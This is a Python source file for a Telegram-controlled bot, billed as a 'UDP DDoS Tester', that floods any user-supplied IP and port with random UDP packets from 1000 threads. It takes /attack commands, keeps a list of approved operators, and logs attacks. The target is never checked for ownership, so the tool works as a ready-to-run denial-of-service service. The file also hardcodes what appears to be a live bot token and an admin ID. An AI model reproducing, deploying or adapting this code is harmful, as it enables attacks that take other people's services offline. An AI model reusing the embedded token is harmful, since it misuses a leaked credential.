#!/usr/bin/env python3
"""
UDP DDoS Tester Bot - Complete Working Version
Admin User ID: 6300435094 (Pre-authorized)
"""

import socket
import threading
import time
import random
import os
import logging
from datetime import datetime
import json
import uuid
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, jsonify

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_logs.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8266888318:AAGCcn95Hj0flaypDcyEEM0KjLfPPC2FPvw"
ADMIN_USER_ID = 6300435094
MAX_THREADS = 1000

class UDPDDoSTester:
    def __init__(self):
        self.running_attacks = {}
        self.authorized_users = {ADMIN_USER_ID}  # Admin pre-added
        self.attack_logs = []
        self.save_authorized_users()
        logger.info(f"Bot initialized with admin {ADMIN_USER_ID} pre-authorized")

    def save_authorized_users(self):
        """Save authorized users to file"""
        try:
            with open('authorized_users.json', 'w') as f:
                json.dump(list(self.authorized_users), f)
        except Exception as e:
            logger.error(f"Error saving authorized users: {e}")

    def load_authorized_users(self):
        """Load authorized users from file"""
        try:
            if os.path.exists('authorized_users.json'):
                with open('authorized_users.json', 'r') as f:
                    loaded_users = set(json.load(f))
                    self.authorized_users.update(loaded_users)
                    # Always ensure admin is in the set
                    self.authorized_users.add(ADMIN_USER_ID)
        except Exception as e:
            logger.error(f"Error loading authorized users: {e}")

    def generate_packet(self, size=1024):
        """Generate random UDP packet data"""
        return os.urandom(size)

    def udp_flood_worker(self, target_ip, target_port, attack_id, duration):
        """Worker function for UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            start_time = time.time()
            packets_sent = 0
            
            while time.time() - start_time < duration and attack_id in self.running_attacks:
                try:
                    packet_data = self.generate_packet()
                    sock.sendto(packet_data, (target_ip, target_port))
                    packets_sent += 1
                    time.sleep(0.01)  # Delay for free plan
                except Exception as e:
                    logger.error(f"Error sending packet: {e}")
                    break
            
            sock.close()
            logger.info(f"Worker completed: {packets_sent} packets sent")
            
        except Exception as e:
            logger.error(f"Worker error: {e}")

    def start_attack(self, target_ip, target_port, duration, user_id):
        """Start UDP DDoS attack"""
        attack_id = str(uuid.uuid4())
        
        # Validate inputs
        try:
            target_port = int(target_port)
            duration = int(duration)
        except ValueError:
            return None, "Invalid port or duration. Must be numbers."
        
        if not (1 <= target_port <= 65535):
            return None, "Invalid port. Must be between 1 and 65535."
        
        if not (1 <= duration <= 300):
            return None, "Invalid duration. Must be between 1 and 300 seconds."
        
        # Start attack
        self.running_attacks[attack_id] = {
            'target_ip': target_ip,
            'target_port': target_port,
            'duration': duration,
            'start_time': datetime.now(),
            'user_id': user_id,
            'status': 'running'
        }
        
        # Start threads
        threads = []
        for i in range(MAX_THREADS):
            thread = threading.Thread(
                target=self.udp_flood_worker,
                args=(target_ip, target_port, attack_id, duration)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Log attack
        attack_log = {
            'attack_id': attack_id,
            'target_ip': target_ip,
            'target_port': target_port,
            'duration': duration,
            'start_time': datetime.now().isoformat(),
            'user_id': user_id,
            'threads': MAX_THREADS
        }
        self.attack_logs.append(attack_log)
        
        logger.info(f"Attack started: {attack_id} -> {target_ip}:{target_port} for {duration}s")
        
        # Schedule cleanup
        def cleanup():
            time.sleep(duration)
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id]['status'] = 'completed'
                del self.running_attacks[attack_id]
        
        cleanup_thread = threading.Thread(target=cleanup)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        return attack_id, f"🔥 Attack started: {target_ip}:{target_port} for {duration}s with {MAX_THREADS} threads"

    def stop_attack(self, attack_id):
        """Stop running attack"""
        if attack_id in self.running_attacks:
            del self.running_attacks[attack_id]
            logger.info(f"Attack stopped: {attack_id}")
            return True
        return False

    def stop_all_attacks(self, user_id):
        """Stop all attacks by a specific user"""
        stopped_count = 0
        attacks_to_stop = []
        
        for attack_id, attack in self.running_attacks.items():
            if attack['user_id'] == user_id:
                attacks_to_stop.append(attack_id)
        
        for attack_id in attacks_to_stop:
            if self.stop_attack(attack_id):
                stopped_count += 1
        
        return stopped_count

    def get_running_attacks(self):
        """Get list of running attacks"""
        return self.running_attacks

    def get_attack_logs(self, limit=10):
        """Get recent attack logs"""
        return self.attack_logs[-limit:]

# Global instance
ddos_tester = UDPDDoSTester()

# Flask app for health check
app = Flask(__name__)

@app.route('/')
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "online",
        "bot": "UDP DDoS Tester",
        "threads": MAX_THREADS,
        "admin": ADMIN_USER_ID,
        "running_attacks": len(ddos_tester.get_running_attacks())
    })

@app.route('/ping')
def ping():
    """Ping endpoint"""
    return "pong"

def is_authorized(user_id):
    """Check if user is authorized"""
    if user_id == ADMIN_USER_ID:
        return True
    return user_id in ddos_tester.authorized_users

# Telegram Bot Commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Contact admin (ID: 6300435094)")
        return
    
    is_admin = user_id == ADMIN_USER_ID
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("🛑 Stop Attacks", callback_data="stop")],
        [InlineKeyboardButton("📊 Running", callback_data="running")],
        [InlineKeyboardButton("📋 Logs", callback_data="logs")]
    ]
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    admin_text = "\n👑 **Admin Commands:**\n• /approve user_id - Approve users" if is_admin else ""
    
    await update.message.reply_text(
        f"🎯 **UDP DDoS Tester Bot**\n\n"
        f"Commands:\n"
        f"• /attack ip:port:duration - Start attack ({MAX_THREADS} threads)\n"
        f"• /stop - Stop all attacks\n"
        f"• /running - Show running attacks\n"
        f"• /logs - Show logs{admin_text}\n\n"
        f"Use menu below or type commands:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /attack ip:port:duration\nExample: /attack 192.168.1.1:8080:60")
        return
    
    try:
        args = context.args[0].split(':')
        if len(args) != 3:
            raise ValueError("Invalid format")
        
        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])
        
        attack_id, message = ddos_tester.start_attack(target_ip, target_port, duration, user_id)
        
        if attack_id:
            await update.message.reply_text(f"✅ {message}\n🆔 ID: `{attack_id}`\n\n💡 Use /stop to stop", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ {message}")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    
    stopped_count = ddos_tester.stop_all_attacks(user_id)
    
    if stopped_count > 0:
        await update.message.reply_text(f"🛑 Stopped {stopped_count} attack(s)!")
    else:
        await update.message.reply_text("ℹ️ No attacks to stop.")

async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /running command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    
    running = ddos_tester.get_running_attacks()
    
    if not running:
        await update.message.reply_text("📊 No attacks running.")
        return
    
    message = "📊 **Running Attacks:**\n\n"
    for attack_id, attack in running.items():
        elapsed = datetime.now() - attack['start_time']
        remaining = attack['duration'] - elapsed.total_seconds()
        message += f"🆔 `{attack_id[:8]}...`\n"
        message += f"🎯 {attack['target_ip']}:{attack['target_port']}\n"
        message += f"⏱️ {max(0, int(remaining))}s left\n\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /logs command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    
    logs = ddos_tester.get_attack_logs(5)
    
    if not logs:
        await update.message.reply_text("📋 No logs available.")
        return
    
    message = "📋 **Recent Logs:**\n\n"
    for log in reversed(logs):
        message += f"🆔 `{log['attack_id'][:8]}...`\n"
        message += f"🎯 {log['target_ip']}:{log['target_port']}\n"
        message += f"⏱️ {log['duration']}s\n"
        message += f"🕐 {log['start_time']}\n\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command (admin only)"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can approve users.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /approve user_id")
        return
    
    try:
        new_user_id = int(context.args[0])
        ddos_tester.authorized_users.add(new_user_id)
        ddos_tester.save_authorized_users()
        await update.message.reply_text(f"✅ User {new_user_id} approved!")
        logger.info(f"Admin {user_id} approved user {new_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command (admin only)"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Only admin can access this.")
        return
    
    authorized_count = len(ddos_tester.authorized_users)
    running_count = len(ddos_tester.get_running_attacks())
    
    message = f"👑 **Admin Panel**\n\n"
    message += f"🆔 Admin ID: `{ADMIN_USER_ID}`\n"
    message += f"👥 Authorized: `{authorized_count}`\n"
    message += f"🚀 Running: `{running_count}`\n\n"
    message += f"**Users:**\n"
    
    for user in sorted(ddos_tester.authorized_users):
        if user == ADMIN_USER_ID:
            message += f"👑 `{user}` (Admin)\n"
        else:
            message += f"👤 `{user}`\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /debug command"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized.")
        return
    
    message = f"🔍 **Debug Info**\n\n"
    message += f"🆔 Your ID: `{user_id}`\n"
    message += f"👑 Admin ID: `{ADMIN_USER_ID}`\n"
    message += f"✅ Is Admin: `{user_id == ADMIN_USER_ID}`\n"
    message += f"✅ Authorized: `{user_id in ddos_tester.authorized_users}`\n"
    message += f"👥 Total Users: `{len(ddos_tester.authorized_users)}`\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    user_id = query.from_user.id
    
    if not is_authorized(user_id):
        await query.answer("❌ You are not authorized.", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "attack":
        await query.edit_message_text(
            "🚀 **Start Attack**\n\n"
            "Send: /attack ip:port:duration\n"
            "Example: /attack 192.168.1.1:8080:60",
            parse_mode='Markdown'
        )
    elif query.data == "stop":
        await stop_command(update, context)
    elif query.data == "running":
        await running_command(update, context)
    elif query.data == "logs":
        await logs_command(update, context)
    elif query.data == "admin":
        await admin_command(update, context)

def run_flask():
    """Run Flask app"""
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

def main():
    """Main function"""
    logger.info("Starting UDP DDoS Tester Bot...")
    logger.info(f"Admin User ID: {ADMIN_USER_ID}")
    logger.info(f"Max Threads: {MAX_THREADS}")
    
    # Start Flask in background
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Create bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("running", running_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("debug", debug_command))
    
    # Add callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    try:
        application.run_polling(drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Bot error: {e}")

if __name__ == "__main__":
    main()
